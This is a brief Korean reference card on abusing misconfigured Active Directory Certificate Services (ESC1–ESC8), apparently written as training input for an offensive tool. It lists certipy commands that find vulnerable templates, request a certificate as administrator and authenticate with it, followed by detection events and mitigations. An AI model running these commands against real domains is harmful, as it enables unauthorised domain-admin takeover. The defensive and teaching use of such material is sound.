# 학습 시드(심화): adcs

> 종합 레퍼런스(확립된 보안 지식 · 권위 출처 검증가능). 라이브 최신화: `assassin --learn adcs`. P1: 머신별 라이트업 미참조.

## 개요
AD CS 악용(T1649): 인증서 서비스 오구성으로 권한상승·지속성. ESC1-8.

## 핵심 기법 · 열거
- ESC1: enrollee 지정 SAN 허용 템플릿→임의 사용자 인증서
- ESC8: NTLM 릴레이→웹 등록(http)
- 인증서로 PKINIT→TGT→DCSync 연계

## 표준 도구 · 명령
```
certipy find -u user@d -p pass -dc-ip <dc> -vulnerable
certipy req -u user@d -p pass -ca <ca> -template <tpl> -upn administrator@d  # ESC1
certipy auth -pfx administrator.pfx -dc-ip <dc>
```

## 블루팀 탐지
비정상 인증서 등록(4886/4887)·SAN 불일치·템플릿 권한 남용.

## 완화
템플릿 권한 강화·관리자 승인·ESC 오구성 점검(certipy)·웹등록 HTTPS/EPA.

- 출처(검증): https://attack.mitre.org/techniques/T1649/
